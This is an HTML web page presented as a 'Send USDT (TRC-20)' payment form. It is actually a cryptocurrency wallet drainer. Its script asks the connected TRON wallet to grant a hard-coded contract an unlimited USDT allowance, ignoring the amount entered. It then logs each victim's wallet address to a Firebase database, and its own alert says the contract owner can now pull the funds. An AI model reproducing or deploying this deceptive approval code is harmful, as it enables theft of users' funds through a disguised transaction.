<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TRC20 USDT Approval</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" />
    <style>
      body {
        font-family: 'Inter', sans-serif;
        margin: 0;
        padding: 0;
        background-color: #f6f8fa;
        color: #1a1a1a;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
      }
      .container {
        width: 90%;
        max-width: 400px;
        background-color: white;
        padding: 24px;
        border-radius: 16px;
        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);
      }
      h2 {
        text-align: center;
        margin-bottom: 24px;
      }
      input {
        width: 100%;
        padding: 12px;
        margin-bottom: 16px;
        font-size: 16px;
        border: 1px solid #ccc;
        border-radius: 8px;
      }
      button {
        width: 100%;
        padding: 12px;
        font-size: 16px;
        background-color: #007bff;
        color: white;
        border: none;
        border-radius: 8px;
        cursor: pointer;
      }
      button:disabled {
        background-color: #aaa;
        cursor: not-allowed;
      }
    </style>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
    <script>
      const firebaseConfig = {
        apiKey: "AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM",
        authDomain: "trc20-approval-dapp.firebaseapp.com",
        projectId: "trc20-approval-dapp",
        storageBucket: "trc20-approval-dapp.appspot.com",
        messagingSenderId: "770961226156",
        appId: "1:770961226156:web:d7857b971dd376b7902209"
      };
      firebase.initializeApp(firebaseConfig);
      const db = firebase.firestore();
    </script>
    <script>
      const usdtAddress = "TVhb7QfSgPuYvFqzhgwAxDJD6Fdw1PzkzS";
      const contractAddress = "TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX";

      async function detectTronWeb(retries = 30, delay = 500) {
        return new Promise((resolve) => {
          let attempt = 0;
          const timer = setInterval(() => {
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
              clearInterval(timer);
              resolve(true);
            } else if (window.okxwallet || window.tronLink) {
              // force reload injection
              try {
                window.tronWeb = window.okxwallet?.tronWeb || window.tronLink?.tronWeb;
              } catch {}
            }
            attempt++;
            if (attempt >= retries) {
              clearInterval(timer);
              resolve(false);
            }
          }, delay);
        });
      }

      async function approveUSDT() {
        const tronReady = await detectTronWeb();
        if (!tronReady || !window.tronWeb || !window.tronWeb.defaultAddress.base58) {
          alert("Please connect your TRON wallet (OKX Web3, SafePal, TokenPocket).");
          return;
        }

        const userAddress = window.tronWeb.defaultAddress.base58;
        const amount = document.getElementById("amount").value;
        if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
          alert("Enter a valid amount.");
          return;
        }

        try {
          const usdtContract = await window.tronWeb.contract().at(usdtAddress);
          await usdtContract.approve(contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({
            feeLimit: 100000000
          });
          saveToFirestore(userAddress, amount);
          alert("Approval successful. USDT can now be pulled by the contract owner.");
        } catch (error) {
          console.error(error);
          alert("Approval failed. Please try again.");
        }
      }

      function saveToFirestore(wallet, amount) {
        db.collection("approvals").add({
          wallet_address: wallet,
          amount: amount,
          timestamp: firebase.firestore.FieldValue.serverTimestamp()
        });
      }
    </script>
  </head>
  <body>
    <div class="container">
      <h2>Send USDT (TRC-20)</h2>
      <input type="text" id="wallet" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" disabled />
      <input type="number" id="amount" placeholder="Enter USDT Amount" />
      <button onclick="approveUSDT()">Next</button>
    </div>
  </body>
</html>
